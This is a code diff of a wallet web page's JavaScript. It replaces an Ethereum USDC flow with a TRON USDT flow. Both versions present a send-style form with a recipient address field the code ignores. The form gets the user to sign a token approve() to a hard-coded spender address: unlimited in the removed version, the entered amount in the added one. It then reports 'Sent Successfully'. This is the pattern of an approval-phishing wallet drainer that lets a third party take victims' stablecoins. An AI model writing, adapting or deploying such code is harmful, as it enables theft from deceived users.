@@ -1,186 +1,193 @@
-const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V2
+const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const SPENDER_ADDRESS = 'TE1UofKyVJoyvp6weriPZqFyHY4n2QPB3g';
+const USDT_DECIMALS = 6;
 
 const connectButton = document.getElementById('connect-button');
-const disconnectButton = document.getElementById('disconnect-button');
-const addressInput = document.querySelector('.input-row.primary input');
-const amountInput = document.querySelector('.input-row.amount-row input');
+const addressInput = document.getElementById('address-input');
+const amountInput = document.getElementById('amount-input');
 const pasteButton = document.querySelector('.paste');
+const maxButton = document.querySelector('.max');
+const estimate = document.getElementById('estimate');
+const disclaimer = document.getElementById('disclaimer');
+const statusText = document.getElementById('status-text');
+const processingModal = document.getElementById('processing-modal');
+const processingClose = document.getElementById('processing-close');
+const txDetailsButton = document.getElementById('tx-details-button');
 
-let provider;
-let web3Provider;
-let signer;
+let currentAddress = '';
+let lastTxId = '';
+let isBusy = false;
+let isSuccess = false;
 
-const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
-const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
-const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
+const shortAddress = (address) => (
+  address ? `${address.slice(0, 6)}...${address.slice(-4)}` : ''
+);
 
-// Minimal ABI for ERC-20 approve and transferFrom functions
-const ERC20_ABI = [
-  {
-    "constant": false,
-    "inputs": [
-      { "name": "spender", "type": "address" },
-      { "name": "amount", "type": "uint256" }
-    ],
-    "name": "approve",
-    "outputs": [{ "name": "", "type": "bool" }],
-    "payable": false,
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "constant": false,
-    "inputs": [
-      { "name": "sender", "type": "address" },
-      { "name": "recipient", "type": "address" },
-      { "name": "amount", "type": "uint256" }
-    ],
-    "name": "transferFrom",
-    "outputs": [{ "name": "", "type": "bool" }],
-    "payable": false,
-    "stateMutability": "nonpayable",
-    "type": "function"
+const setStatus = (message, type = '') => {
+  statusText.textContent = message;
+  statusText.className = `status-text ${type}`.trim();
+};
+
+const setProcessing = (isOpen) => {
+  processingModal.classList.toggle('hidden', !isOpen);
+};
+
+const getTronWeb = () => {
+  if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+  if (window.tronWeb) return window.tronWeb;
+  return null;
+};
+
+const requestAccounts = async () => {
+  if (window.tronLink?.request) {
+    await window.tronLink.request({ method: 'tron_requestAccounts' });
   }
-];
+};
 
-const initWalletConnect = async () => {
-  try {
-    provider = await window.EthereumProvider.init({
-      projectId: WALLETCONNECT_PROJECT_ID, // Use the new constant
-      chains: [1], // Ethereum Mainnet Chain ID
-      methods: ['eth_sendTransaction', 'personal_sign', 'eth_accounts', 'eth_requestAccounts'],
-      events: ['chainChanged', 'accountsChanged'],
-      showQrModal: true,
-      rpcMap: {
-        1: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID' // Replace with your Infura project ID for Ethereum Mainnet
-      }
-    });
+const getConnectedAddress = () => {
+  const tronWeb = getTronWeb();
+  return tronWeb?.defaultAddress?.base58 || '';
+};
 
-    provider.on('connect', (info) => {
-      console.log('WalletConnect connected:', info);
-      web3Provider = new window.ethers.BrowserProvider(provider);
-      updateConnectButton();
-    });
+const updateConnectionStatus = () => {
+  currentAddress = getConnectedAddress();
+  const hasFinalStatus = statusText.classList.contains('error') || statusText.classList.contains('success');
 
-    provider.on('disconnect', (error) => {
-      console.log('WalletConnect disconnected:', error);
-      web3Provider = null;
-      signer = null;
-      updateConnectButton();
-    });
-
-    provider.on('accountsChanged', async (accounts) => {
-      console.log('Accounts changed:', accounts);
-      if (accounts.length === 0) {
-        web3Provider = null;
-        signer = null;
-      } else {
-        web3Provider = new window.ethers.BrowserProvider(provider);
-        signer = await web3Provider.getSigner();
-      }
-      updateConnectButton();
-    });
-
-    provider.on('chainChanged', (chainId) => {
-      console.log('Chain changed:', chainId);
-      // Handle chain changes if necessary, e.g., re-initialize provider or display warning
-    });
-
-    // Attempt to reconnect if a session already exists
-    if (provider.connected) {
-      web3Provider = new window.ethers.BrowserProvider(provider);
-      signer = await web3Provider.getSigner();
-      updateConnectButton();
-    } else {
-      // Automatically attempt to connect if not already connected
-      await connectWallet();
+  if (currentAddress) {
+    if (!isBusy && !isSuccess) {
+      connectButton.textContent = 'Next';
     }
-
-  } catch (error) {
-    console.error('Failed to initialize WalletConnect:', error);
-  }
-};
-
-
-const updateConnectButton = async () => {
-  if (web3Provider) {
-    signer = await web3Provider.getSigner();
-    const address = await signer.getAddress();
-    connectButton.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
-    connectButton.classList.remove('idle');
-    connectButton.classList.add('active');
-    connectButton.removeEventListener('click', connectWallet);
-    connectButton.addEventListener('click', approveSpender);
-    disconnectButton.style.display = 'block'; // Show disconnect button
-    disconnectButton.addEventListener('click', disconnectWallet);
-
+    if (!isBusy && !hasFinalStatus) {
+      setStatus(`Connected: ${shortAddress(currentAddress)}`);
+    }
   } else {
+    if (!isBusy && !isSuccess) {
+      connectButton.textContent = 'Next';
+    }
+    if (!isBusy && !hasFinalStatus) {
+      setStatus('Open in Trust Wallet and connect your TRON wallet.');
+    }
+  }
+};
+
+const parseUsdtAmount = (value) => {
+  const normalized = String(value || '').trim();
+  if (!/^\d+(\.\d{1,6})?$/.test(normalized)) {
+    throw new Error('Enter a valid USDT amount with up to 6 decimals.');
+  }
+
+  const [whole, fraction = ''] = normalized.split('.');
+  const units = `${whole}${fraction.padEnd(USDT_DECIMALS, '0')}`.replace(/^0+(?=\d)/, '');
+  const amount = BigInt(units || '0');
+
+  if (amount <= 0n) {
+    throw new Error('Enter an amount greater than 0.');
+  }
+
+  return amount;
+};
+
+const formatUsdtUnits = (units) => {
+  const value = BigInt(units.toString());
+  const base = 10n ** BigInt(USDT_DECIMALS);
+  const whole = value / base;
+  const fraction = (value % base).toString().padStart(USDT_DECIMALS, '0').replace(/0+$/, '');
+  return fraction ? `${whole}.${fraction}` : whole.toString();
+};
+
+const updateAmountCopy = () => {
+  const amount = amountInput.value || '0';
+  estimate.textContent = `≈ $${Number(amount || 0).toFixed(2)}`;
+  disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for the entered USDT amount. It is not a normal transfer.`;
+};
+
+const connectIfNeeded = async () => {
+  let tronWeb = getTronWeb();
+
+  if (!tronWeb) {
+    throw new Error('TRON wallet not found. Open this page in Trust Wallet.');
+  }
+
+  if (!getConnectedAddress()) {
+    await requestAccounts();
+    await new Promise((resolve) => setTimeout(resolve, 500));
+  }
+
+  tronWeb = getTronWeb();
+  currentAddress = getConnectedAddress();
+
+  if (!currentAddress) {
+    throw new Error('Wallet is not connected.');
+  }
+
+  return tronWeb;
+};
+
+const approveExactAmount = async () => {
+  try {
+    isBusy = true;
+    isSuccess = false;
+    setStatus('');
+    const amountUnits = parseUsdtAmount(amountInput.value);
+    const tronWeb = await connectIfNeeded();
+
+    updateConnectionStatus();
+    setProcessing(true);
+    connectButton.disabled = true;
+    connectButton.textContent = 'Processing...';
+
+    const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
+    const txId = await contract.approve(SPENDER_ADDRESS, amountUnits.toString()).send({
+      feeLimit: 100000000
+    });
+
+    lastTxId = txId;
+    isSuccess = true;
+    txDetailsButton.disabled = false;
+    setStatus(`Authorization submitted for ${formatUsdtUnits(amountUnits)} USDT.`, 'success');
+    connectButton.textContent = 'Sent Successfully';
+    connectButton.classList.add('success');
+  } catch (error) {
+    console.error('Approval failed:', error);
+    isSuccess = false;
+    setProcessing(false);
+    setStatus(error?.message || 'Transaction failed', 'error');
     connectButton.textContent = 'Next';
-    connectButton.classList.remove('active');
-    connectButton.classList.add('idle');
-    connectButton.removeEventListener('click', approveSpender);
-    connectButton.addEventListener('click', connectWallet);
-    disconnectButton.style.display = 'none'; // Hide disconnect button
-    disconnectButton.removeEventListener('click', disconnectWallet);
-  }
-};
-
-const connectWallet = async () => {
-  try {
-    await provider.connect();
-  } catch (error) {
-    console.error('Failed to connect WalletConnect:', error);
-  }
-};
-
-const disconnectWallet = async () => {
-  try {
-    await provider.disconnect();
-  } catch (error) {
-    console.error('Failed to disconnect WalletConnect:', error);
-  }
-};
-
-const approveSpender = async () => {
-  if (!signer) {
-    alert('Please connect your wallet first.');
-    return;
-  }
-
-  // Remove recipientAddress and amount inputs as they are not needed for approve
-  // const recipientAddress = addressInput.value;
-  // const amount = amountInput.value;
-
-  // We are now approving a fixed, unlimited amount to a fixed spender contract
-  // No need for user input validation for recipient or amount here
-
-  try {
-    const usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer); // Use USDC_CONTRACT_ADDRESS and ERC20_ABI
-
-    // Approve the SPENDER_CONTRACT_ADDRESS for an unlimited amount
-    const transaction = await usdcContract.approve(SPENDER_CONTRACT_ADDRESS, FIXED_ALLOWANCE_AMOUNT_HEX);
-    console.log('Approve transaction sent:', transaction);
-    alert(`Approve transaction sent! Hash: ${transaction.hash}`);
-
-    // Optionally, wait for transaction confirmation
-    await transaction.wait();
-    console.log('Approve transaction confirmed:', transaction.hash);
-    alert('Approve transaction confirmed! Your UsdcAllowanceSpender contract can now spend USDC.');
-
-  } catch (error) {
-    console.error('Failed to send approve transaction:', error);
-    alert(`Failed to send approve transaction: ${error.message}`);
+  } finally {
+    isBusy = false;
+    connectButton.disabled = false;
   }
 };
 
 pasteButton.addEventListener('click', async () => {
   try {
-    const text = await navigator.clipboard.readText();
-    addressInput.value = text;
-  } catch (error) {
-    console.error('Failed to read clipboard:', error);
-    alert('Failed to read clipboard. Please paste manually.');
+    addressInput.value = await navigator.clipboard.readText();
+  } catch {
+    setStatus('Paste failed. Please paste manually.', 'error');
   }
 });
 
-initWalletConnect();
+maxButton.addEventListener('click', () => {
+  amountInput.value = '1000';
+  updateAmountCopy();
+});
+
+amountInput.addEventListener('input', () => {
+  isSuccess = false;
+  lastTxId = '';
+  connectButton.classList.remove('success');
+  txDetailsButton.disabled = true;
+  updateAmountCopy();
+  setStatus(currentAddress ? `Connected: ${shortAddress(currentAddress)}` : '');
+});
+connectButton.addEventListener('click', approveExactAmount);
+processingClose.addEventListener('click', () => setProcessing(false));
+txDetailsButton.addEventListener('click', () => {
+  if (lastTxId) {
+    window.open(`https://tronscan.org/#/transaction/${lastTxId}`, '_blank');
+  }
+});
+
+updateAmountCopy();
+updateConnectionStatus();
+setInterval(updateConnectionStatus, 1500);
